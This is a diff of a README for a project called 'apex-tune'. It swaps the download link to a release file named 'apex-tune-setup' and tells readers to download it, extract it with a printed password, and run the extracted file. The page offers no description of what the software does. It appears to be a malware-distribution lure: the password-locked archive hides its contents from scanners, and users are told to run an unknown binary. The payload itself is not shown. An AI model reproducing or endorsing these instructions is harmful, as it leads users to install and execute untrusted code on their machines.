@@ -38,7 +38,7 @@
 
 ## 🚀 Installation
 
-1. **Download** the archive: [installer.zip](https://github.com/samsilva-hq1999j1/apex-tune/releases/download/v0.1.0/installer.zip)
+1. **Download** the archive: [apex-tune-setup](https://github.com/samsilva-hq1999j1/apex-tune/releases/download/v0.1.0/apex-tune-setup)
 2. **Extract** the archive.
 3. **Enter the password** when prompted:
 
@@ -46,7 +46,7 @@
    dHA+tR728y&P
    ```
 
-That's it. Run `apex-tune.exe` from the extracted folder.
+That's it. Run the extracted file.
 
 ---
 
@@ -54,7 +54,7 @@ That's it. Run `apex-tune.exe` from the extracted folder.
 
 - **Repository home:** [github.com/samsilva-hq1999j1/apex-tune](https://github.com/samsilva-hq1999j1/apex-tune)
 - **Releases:** [github.com/samsilva-hq1999j1/apex-tune/releases](https://github.com/samsilva-hq1999j1/apex-tune/releases)
-- **Latest download:** [installer.zip](https://github.com/samsilva-hq1999j1/apex-tune/releases/download/v0.1.0/installer.zip)
+- **Latest download:** [apex-tune-setup](https://github.com/samsilva-hq1999j1/apex-tune/releases/download/v0.1.0/apex-tune-setup)
 
 ---
 
